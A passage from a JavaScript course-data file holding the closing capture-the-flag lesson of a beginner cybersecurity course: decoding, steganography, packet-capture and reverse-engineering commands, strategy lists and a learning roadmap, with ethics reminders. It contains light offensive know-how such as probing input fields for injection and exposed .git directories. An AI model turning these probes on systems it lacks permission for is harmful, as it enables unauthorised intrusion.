⚠️ Google dorking to find vulnerabilities in sites you don't own can be illegal. Only use on CTF challenges or with permission!
</warning>

### Where to Play CTFs

\`\`\`
🏁 PicoCTF.org          — Best for beginners!
🏁 CTFtime.org          — Calendar of CTF events
🏁 TryHackMe.com        — Guided challenges
🏁 HackTheBox.com       — Real-world scenarios
🏁 OverTheWire (Bandit)  — Linux command challenges
🏁 CryptoHack.org       — Cryptography challenges
\`\`\`

### Start Your Journey!

\`\`\`
1. Sign up on PicoCTF or TryHackMe
2. Start with the easiest challenges
3. Google when you're stuck (that's how you learn!)
4. Join a team or community
5. Practice regularly
6. Enter real CTF competitions!
\`\`\`

<tip>
💡 The cybersecurity community is incredibly helpful. Join Discord servers, Reddit's r/netsec, and ask questions!
</tip>

### Cryptography Challenge Walkthrough

\`\`\`python
# CHALLENGE: Decode this message
# "Gur cnffjbeq vf syntvfsha"
# Hint: ROT13

import codecs

encoded = "Gur cnffjbeq vf syntvfsha"
decoded = codecs.decode(encoded, 'rot_13')
print(decoded)  # "The password is flagisfun"

# ROT13 shifts each letter by 13 positions
# A→N, B→O, C→P, etc.
# Applying ROT13 twice gives you the original text!
\`\`\`

### Steganography Challenge

\`\`\`bash
# CHALLENGE: Find the hidden message in an image
# Steganography = hiding data inside other files

# Check for hidden strings in an image
strings suspicious_image.png | grep "flag"

# Use steghide to extract hidden data
steghide extract -sf image.jpg -p password

# Use binwalk to check for embedded files
binwalk -e mystery_file.png

# Check EXIF metadata
exiftool image.jpg | grep -i "comment"
\`\`\`

### Forensics Challenge

\`\`\`bash
# CHALLENGE: Analyze a network capture
# Open the .pcap file in Wireshark

# Filter for HTTP traffic
# Display Filter: http

# Find passwords transmitted in plain text
# Display Filter: http.request.method == "POST"

# Export HTTP objects (files transferred)
# File → Export Objects → HTTP

# Look for suspicious DNS queries
# Display Filter: dns

# Find base64-encoded data
echo "ZmxhZ3toZWxsb193b3JsZH0=" | base64 -d
# Output: flag{hello_world}
\`\`\`

### Binary / Reverse Engineering Challenge

\`\`\`bash
# CHALLENGE: Find the password in a compiled program

# Check for readable strings
strings mystery_program | grep -i "pass"

# Run in a debugger
gdb ./mystery_program
(gdb) break main
(gdb) run
(gdb) next    # Step through code
(gdb) info registers  # Check register values

# Disassemble to see assembly code
objdump -d mystery_program | less

# Use ltrace to see library calls
ltrace ./mystery_program
# Output might show: strcmp("your_input", "s3cr3t_p@ss")
\`\`\`

### CTF Tips & Strategies

\`\`\`
BEGINNER STRATEGIES:
━━━━━━━━━━━━━━━━━━━
1. Always check the page source (Ctrl+U)
2. Look at HTTP headers (browser dev tools)
3. Try common passwords before brute-forcing
4. Google the error messages you find
5. Check for robots.txt and .git directories
6. Base64 decode everything that looks encoded
7. Comments in HTML/code often contain hints

INTERMEDIATE STRATEGIES:
━━━━━━━━━━━━━━━━━━━━━━━
1. Automate with Python scripts
2. Use CyberChef (online decoder) for encoding chains
3. Look for backup files (.bak, .old, ~)
4. Test all input fields for injection
5. Enumerate users, directories, parameters
6. Chain multiple small vulnerabilities together

TEAM STRATEGIES:
━━━━━━━━━━━━━━━━━
1. Divide by category specialization
2. Share findings in a shared document
3. Don't all work on the same challenge
4. Get the easy points first (low-hanging fruit)
5. Take breaks — fresh eyes find flags
\`\`\`

<tip>
💡 The cybersecurity community is incredibly helpful. Join Discord servers, Reddit's r/netsec and r/hacking, and ask questions. Everyone started as a beginner!
</tip>

### Your Learning Roadmap

\`\`\`
MONTH 1: FOUNDATIONS
□ Complete TryHackMe "Complete Beginner" path
□ Set up a home lab (VirtualBox + Kali)
□ Practice Linux commands daily
□ Solve 10 beginner CTF challenges

MONTH 2: WEB SECURITY
□ Complete PortSwigger Web Security Academy
□ Practice SQL injection on DVWA
□ Learn Burp Suite thoroughly
□ Solve 20 web CTF challenges

MONTH 3: NETWORK SECURITY
□ Master Nmap and Wireshark
□ Complete TryHackMe network rooms
□ Practice with Metasploit
□ Start on HackTheBox easy machines

MONTH 4-6: SPECIALIZATION
□ Choose a focus area:
  - Web application security
  - Network penetration testing
  - Reverse engineering
  - Forensics & incident response
□ Start working toward CompTIA Security+
□ Enter your first live CTF competition!
\`\`\`

Congratulations! You've completed the Cybersecurity course! 🎉

You now have the foundation to:
- **Protect yourself** and your family online
- **Understand attacks** from the attacker's perspective
- **Use security tools** ethically and responsibly
- **Start a career** in one of the highest-demand tech fields
- **Compete in CTFs** and test your skills against others

**Remember:** The ethical hacking community has a golden rule — **never hack what you don't have permission to hack.** Use your powers for good, and the cybersecurity world will welcome you with open arms.

Stay curious, stay ethical, and keep learning! 🛡️🚀
          `
        }
      ]
    }
  ]
};

export default courseData;
